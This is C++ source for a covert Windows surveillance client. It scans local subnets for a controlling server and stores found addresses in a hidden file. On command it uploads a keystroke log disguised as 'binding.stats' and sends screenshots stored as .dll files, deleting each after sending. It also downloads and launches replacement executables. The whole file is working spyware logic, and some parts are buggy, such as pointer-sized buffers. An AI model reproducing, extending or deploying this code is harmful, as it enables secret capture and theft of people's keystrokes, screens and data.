#include"stdafx.h"									// Common headers

#pragma comment(lib, "ws2_32.lib")					// Link library for winsock
#pragma comment(lib, "mswsock.lib")					// MS sock

#define SERVER_PORT 12345							// Port to connect onto
#define BUFFER_SIZE	4096							// For send and recv

HANDLE hFind;
TCHAR IPText[]=L"ips";
TCHAR IPFileName[MAX_PATH];
char lastKnownIP[5];
char serverIPAddress[16];							// Server's IP address: We will have to scan
char localIPAddress[16];							// Client's IP address (my own address)
char tempAddress[16];								// Address currently scanned
char szHostName[128] = "";							// Client's name
int bytesSent;										// Number of bytes sent
int no_Files;
char buf[100] = "This is a test. Over. This is a test. Over.";		// For testing purposes only
char *FileDataBuffer;
char *FileNameBuffer;
char DirectoryMBS[MAX_PATH];
char dirConvert[MAX_PATH];
bool flag;
size_t size;
FILE *fp;
TCHAR ProcessPath[MAX_PATH];
TCHAR UpdatedPath[MAX_PATH];
HWND ParentHandle;
HANDLE transHandle;
int k;


class Header {
public:
				int rCode;
				int filesInQueue;
				unsigned int sizeNextMessage;
				int sizeNextMessageName;

				void set(int r, int f = 0, int s = 0, int snm = 0)
				{
					rCode = r;
					filesInQueue = f;
					sizeNextMessage = s;
					sizeNextMessageName = snm;
				}

};

int MultipleFileTransferHandler(SOCKET s, SOCKADDR_IN target, WIN32_FIND_DATA ffd, int no_Files)
{
	
	TCHAR ffName[MAX_PATH];
	char ffmbsName[MAX_PATH];
	unsigned int FileSize;
	Header h;

	do
	{

		if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			
			if (connect(s, (SOCKADDR*)&target, sizeof(target)) == SOCKET_ERROR)		// If not, return ERR_CANNOT_CONNECT
			{
				return ERR_CANNOT_CONNECT;											// so that it can start over
			}

			FileSize = (unsigned int) ((ffd.nFileSizeHigh * (MAXDWORD + 1)) + ffd.nFileSizeLow);
			StringCchCopy(ffName, MAX_PATH, ffd.cFileName);
			PathStripPath(ffName);
			wcstombs_s(&s, ffmbsName, MAX_PATH, ffName, MAX_PATH);
			h.set(MESG_TYPE_BITMAP, no_Files, FileSize, wcslen(ffName));
			send(s, (char*)&h, sizeof(h), 0);								// SEND no. of files, sizeNextMessageName & sizeNextMessage
			send(s, ffmbsName, strlen(ffmbsName), 0);						// SEND FileName
			send(s, "\r\n", 2, 0);											// SEND delimiter
			HANDLE transHandle = CreateFile(
				ffd.cFileName,
				GENERIC_READ,
				0,
				NULL,
				OPEN_EXISTING,
				FILE_FLAG_SEQUENTIAL_SCAN,
				NULL);

			if (transHandle == INVALID_HANDLE_VALUE)	continue;
			
			if (TransmitFile(												// SEND File Data
					s,
					transHandle,
					0,
					0,
					NULL,
					NULL,
					TF_REUSE_SOCKET))	
			{
				CloseHandle(transHandle);
				recv(s, (char*)&h, sizeof(h), 0);
				if (h.rCode == RESPONSE_FILE_RECEIVE_SUCCESS)
					DeleteFile(ffd.cFileName);
			}

			
			no_Files--;

		}	

	}	while ((FindNextFile(hFind, &ffd) != 0) && (no_Files > 0));
		
	FindClose(hFind);
		
	return 0;

}

int ReceiveFileNameThenFile(SOCKET s, Header h, LPCTSTR Path)
{
	// ALSO SENDS ACK ON FILE RECEIVE

	char* EndOfFileName = NULL;
	int copyTill;
	int totalBytesReceived = 0;
	int bytesReceivedNow = 0;
	DWORD bytesWritten;
	
	FileNameBuffer = new char[h.sizeNextMessage + 5];		// Allocate extra for extensions, and name conflicts
	FileDataBuffer = (char*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE);	// Zero out memory
	memset(FileNameBuffer, '0', sizeof(FileNameBuffer));										// Zero out memory
	
	bytesReceivedNow = recv(s, (char*)FileDataBuffer, sizeof(FileDataBuffer) - 1, 0);	// One less for '\0'
	FileDataBuffer[bytesReceivedNow] = '\0';
	EndOfFileName = strstr(FileDataBuffer, "\r\n");
	
	if (EndOfFileName == NULL)
	{
		// Error processing. Try to take h.sizeNextMessageName + 2 characters as
		// filename and write rest to file
	}
	
	copyTill = (int) (EndOfFileName - FileDataBuffer);

	strncpy(FileNameBuffer, FileDataBuffer, copyTill);
	FileNameBuffer[copyTill] = '\0';

	StringCchCopy(UpdatedPath, MAX_PATH, Path);
	StringCchCat(UpdatedPath, MAX_PATH, FileNameBuffer);

	HANDLE hFile = CreateFile(
		UpdatedPath,
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_FLAG_SEQUENTIAL_SCAN,
		NULL);
		
	if (hFile == INVALID_HANDLE_VALUE)
	{
		// Error handling: Unable to write to file
	}
	
	SetFilePointer(hFile, 0, NULL, FILE_END);
	
	if (bytesReceivedNow > (h.sizeNextMessageName + 2))
	{
		WriteFile(
			hFile,
			EndOfFileName + 2,
			bytesReceivedNow - (copyTill + 2),
			&bytesWritten,
			NULL);
		totalBytesReceived += (bytesReceivedNow - (copyTill + 2));
	}
	
	while ((bytesReceivedNow = recv(s, FileDataBuffer, sizeof(FileDataBuffer) - 1, 0)) > 0)
	{
		WriteFile(hFile,
			FileDataBuffer,
			bytesReceivedNow,
			&bytesWritten,
			NULL);
			
		totalBytesReceived += bytesReceivedNow;
		
	}
	
	CloseHandle(hFile);
	
	if (bytesReceivedNow == h.sizeNextMessage)
	{
		h.set(RESPONSE_FILE_RECEIVE_SUCCESS);
		send(s, (char*)&h, sizeof(h), 0);
	}
	
	else
	{
		h.set(RESPONSE_FILE_SIZE_MISMATCH);
		send(s, (char*)&h, sizeof(h), 0);
	}
	
	delete[] FileNameBuffer;
	HeapFree(GetProcessHeap(), 0, FileDataBuffer);
	
	return 0;
}



int ProcessMessages(Header h, SOCKET s, SOCKADDR_IN target)
{
	switch(h.rCode)
	{
	case MESG_TYPE_UPDATE:
		GetModuleFileName(NULL, ProcessPath, MAX_PATH);
		mbstowcs_s(&size, UpdatedPath, MAX_PATH, DirectoryMBS, MAX_PATH);
		ReceiveFileNameThenFile(s, h, UpdatedPath);
		int bRet;
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));
		si.cb = sizeof(si);
		if (
			( bRet =
			CreateProcess(								// Spawn the new process
				UpdatedPath,							// New dir %windir%\AMS\<name>.exe
				ProcessPath,							// old dir %somewhere%\<name>.exe
				NULL,									// phandle not inherited
				NULL,									// thandle not inherited
				true,									// inheritance true
				NORMAL_PRIORITY_CLASS,					// normal priority
				NULL,									// parent's environment block and
				NULL,									// starting directory
				&si,									// who needs this
				&pi)									// oh the asserter does
					)		!= 0)						// If function successful
									PostQuitMessage(0); // exit. Otherwise proceed.
		break;

	case MESG_TYPE_CONFIG:
		ReceiveFileNameThenFile(s, h, "w");
		PostMessage(ParentHandle, WM_PARSE_FILE, NULL, NULL);
		break;

	case REQUEST_CONFIG_FILE:
		long int pos;
		wcstombs_s(&size, DirectoryMBS, MAX_PATH, MAINDIR, MAX_PATH);
		wcstombs_s(&size, dirConvert, MAX_PATH, configFileName, MAX_PATH);
		strcat_s(DirectoryMBS, dirConvert);
		fp = fopen(DirectoryMBS, "r");
		fseek(fp, 0, SEEK_END);
		pos = ftell(fp);
		FileDataBuffer = new char[pos + 1];
		h.set(MESG_TYPE_CONFIG, 1, pos, wcslen(configFileName));		
		send(s, (char*)&h, sizeof(h), 0);								// SEND sizeNextMessage and sizeNextMessageName
		send(s, dirConvert, strlen(dirConvert), 0);						// SEND FileName	
		send(s, "\r\n", 2, 0);											// SEND delimiter
		rewind(fp);
		fread(FileDataBuffer, pos, 1, fp);
		k = send(s, FileDataBuffer, pos, 0);							// SEND File Data
		recv(s, (char*)&h, sizeof(h), 0);								// RECEIVE ACK: We needn't check because
		delete[] FileDataBuffer;										// there is nothing we can do if it didn't get sent.
		fclose(fp);
		PostMessage(ParentHandle, WM_PARSE_FILE, NULL, NULL);
		break;

	case REQUEST_KEYLOG_ONLY:
		TCHAR movTemp[MAX_PATH];
		TCHAR movTempNew[MAX_PATH];
		long int posn;
		StringCchCopy(movTemp, MAX_PATH, MAINDIR);
		StringCchCat(movTemp, MAX_PATH, logFileName);
		StringCchCopy(movTempNew, MAX_PATH, movTemp);
		StringCchCat(movTempNew, MAX_PATH, L".t");
		if (MoveFile(movTemp, movTempNew) == 0)
		{
			if (GetLastError() == ERROR_FILE_NOT_FOUND)
			{
				h.set(RESPONSE_NO_NEW_DATA);			
				send(s, (char*)&h, sizeof(h), 0);
				break;
			}
		}
		
		transHandle = CreateFile(
			movTempNew,
			GENERIC_READ,
			0,
			NULL,
			OPEN_EXISTING,
			FILE_FLAG_SEQUENTIAL_SCAN,
			NULL);

		if (transHandle == INVALID_HANDLE_VALUE)
		{
			h.set(RESPONSE_NO_NEW_DATA);			
			send(s, (char*)&h, sizeof(h), 0);
			break;
		}

		DWORD FileSize;
		FileSize = GetFileSize(transHandle, NULL);
		h.set(MESG_TYPE_LOG, 1, (int)FileSize, strlen("binding.stats"));			
		send(s, (char*)&h, sizeof(h), 0);											// SEND sizeNextMessage and sizeNextMessageName
		send(s, "binding.stats", strlen("binding.stats"), 0);						// SEND FileName
		send(s, "\r\n", 2, 0);														// SEND delimiter
		
		if (TransmitFile(															// SEND File Data
				s,
				transHandle,
				0,
				0,
				NULL,
				NULL,
				TF_DISCONNECT))	
		{
			CloseHandle(transHandle);
			recv(s, (char*)&h, sizeof(h), 0);
			if (h.rCode == RESPONSE_FILE_RECEIVE_SUCCESS)
				DeleteFile(movTempNew);
		}

		else
		{
			CloseHandle(transHandle);
		}
		
		break;

	case REQUEST_SCREENS_ONLY:
		WIN32_FIND_DATA ffd;
		no_Files = 0;
		
		StringCchCopy(ProcessPath, MAX_PATH, MAINDIR);
		StringCchCat(ProcessPath, MAX_PATH, L"*.dll");
		hFind = INVALID_HANDLE_VALUE;
		hFind = FindFirstFile(ProcessPath, &ffd);
		
		if (INVALID_HANDLE_VALUE == hFind)
		{
			h.set(RESPONSE_NO_NEW_DATA);
			break;
		}
		do
		{
			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				no_Files++;	
			}
		}	while (FindNextFile(hFind, &ffd) != 0);
		
		FindClose(hFind);

		hFind = FindFirstFile(ProcessPath, &ffd);

		if (INVALID_HANDLE_VALUE == hFind)
		{
			h.set(RESPONSE_NO_NEW_DATA);
			break;
		}
		
		MultipleFileTransferHandler(s, target, ffd, no_Files);
		
		break;

	default:
		h.set(INVALID_REQUEST);
		send(s, (char*)&h, sizeof(h), 0);
			break;
	}

	return 0;
}

int CommunicationThread(SOCKET s, SOCKADDR_IN target)
{
	Header header;
	header.set(ERROR_STATE, 222, 45, 334);
	bytesSent = send(s, (char*)&header, sizeof(header), 0);
	recv(s, (char*)&header, sizeof(header), 0);
	ProcessMessages(header, s, target);
	
	//
	//bytesSent = send(s, buf, sizeof(buf), 0);								// Otherwise, store bytes sent
	// printf("Sent %d bytes successfully\n", bytesSent);
	return 0;
	
}
bool connect_to(SOCKADDR_IN target, SOCKET s, char* IP)						// Connects to specified address on specified socket
{
	if (connect(s, (SOCKADDR*)&target, sizeof(target)) == SOCKET_ERROR)		// If not, return false
	{
		return false;														// so that it can go on to next address
	}

	
	if (strcmp(IP, "nothing") != 0)
	{
	
		DWORD wr;
		HANDLE hipFile = CreateFile(IPFileName,
			GENERIC_READ|GENERIC_WRITE,
			0,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN,
			NULL);

		SetFilePointer(hipFile, 0, NULL, FILE_END);
		WriteFile(hipFile, IP, strlen(IP), &wr, NULL);
		WriteFile(hipFile, "\r\n", 2, &wr, NULL);
		CloseHandle(hipFile);
	}

	CommunicationThread(s, target);				// If connect successful start communication
	closesocket(s);
	Sleep(500);									// Need to give some time before attempting to connect
												// to server again: Otherwise it will go on to the next IP
	return true;
}

DWORD WINAPI NetworkSetup(LPVOID param)
{
	ParentHandle = (HWND) param;
	WORD wVersionRequested;
	WSADATA wsaData;
	SOCKADDR_IN target;
	SOCKADDR_IN local;
	HOSTENT *phost = 0;
	SOCKET s;
	char aszIPAddresses[10][16];
	int err, on = 1;
	char digit[5];

while (1)									// This is the outermost outer while loop, it should be 
{											// executed only once. If it does, again, then WSA problem
	/* 1. Startup.	*/
	wVersionRequested = MAKEWORD(2,2);
	err = WSAStartup(wVersionRequested, &wsaData);

	if (err != 0)
	{
		ERROR_STATE = WSAGetLastError();
		WSACleanup();
		continue;
	}

	/* 2. Get own IP Address */
	if (gethostname(szHostName, sizeof(szHostName)))
	{
		ERROR_STATE = WSAGetLastError();
		WSACleanup();
		continue;
	}

	phost = gethostbyname(szHostName);

	if (!phost)
	{
		ERROR_STATE = WSAGetLastError();
		WSACleanup();
		continue;
	}

	// Now phost contains all the data.

	for (int iCount = 0; ((phost->h_addr_list[iCount]) && (iCount < 10)); ++iCount)
	{
		memcpy(&local.sin_addr, phost->h_addr_list[iCount], phost->h_length);
		strcpy(aszIPAddresses[iCount], inet_ntoa(local.sin_addr));
		for (int m = strlen(aszIPAddresses[iCount]) - 1; ; m--)
		{
			if (aszIPAddresses[iCount][m] == '.')
			 {
				 aszIPAddresses[iCount][m+1] = '\0';
				 break;
			 }
		}

	}		/* This ends the for loop. Now aszIPAddresses has all the local IP Addresses in the form
				x.x.x.
				Now when we want to connect to the server we try all combinations of x.x.x.n varying n
				from 0 to 255, for each value of aszIPAddresses[i].
			*/
	
	target.sin_family = AF_INET;				// Filling out the values
	target.sin_port = htons(SERVER_PORT);		// that will remain constant
	
	while (1)
	{
		
		/* 3. Create a socket first. Socket creation does not depend on any IP address, so it is almost guaranteed to succeed */
		s = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == INVALID_SOCKET)
		{
			ERROR_STATE = WSAGetLastError();
			WSACleanup();
			continue;
		}

		// But first we see in our file for the recently connected-to servers. We try them first.
		StringCchCopy(IPFileName, MAX_PATH, MAINDIR);
		StringCchCat(IPFileName, MAX_PATH, IPText);
		flag = false;
	
		HANDLE hipFile = CreateFile(IPFileName,				// This is that file.
			GENERIC_READ|GENERIC_WRITE,
			0,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_HIDDEN,
			NULL);

		if (GetLastError() != ERROR_FILE_NOT_FOUND)			// If the file exists, try each address in it.
		{
			char buf[100];
			char temp[3];
			DWORD nread;
			SetFilePointer(hipFile, 0, NULL, FILE_BEGIN);
			ReadFile(hipFile, &buf, sizeof(buf), &nread, NULL);
			if (nread < sizeof(buf))
				buf[nread] = '\0';
			CloseHandle(hipFile);
			int i = 0;
			int j = 0;
			while (buf[i] != '\0')
			{
				j=0;
				while (buf[i] != '\n' && buf[i] != '\0')
				{
					temp[j] = buf[i];
					j++;
					i++;
				}
				temp[j] = '\0';
				strcpy_s(tempAddress, aszIPAddresses[0]);
				strcat_s(tempAddress, temp);
				target.sin_addr.s_addr = inet_addr(tempAddress);
				if (connect_to(target, s, "nothing"))				// "nothing" - Telling connect_to that we don't
				{													// have to write this IP in the file.
					flag = true;
					break;
				}
				i++;
			}
		}


		if (flag)													// Meaning one of the IP addresses in the file
			continue;												// were successfully connected to.

		for (int i = 0; ((i < 10) && aszIPAddresses[i]); i++)
		{
			for (int j = 0; j < 256; j++)
			{
				_itoa(j, digit, 10);
				strcpy(tempAddress, aszIPAddresses[i]);
				strcat(tempAddress, digit);
				target.sin_addr.s_addr = inet_addr(tempAddress);
				if (connect_to(target, s, digit))
					break;
			}
		}

	}
		
	WSACleanup();

}

}


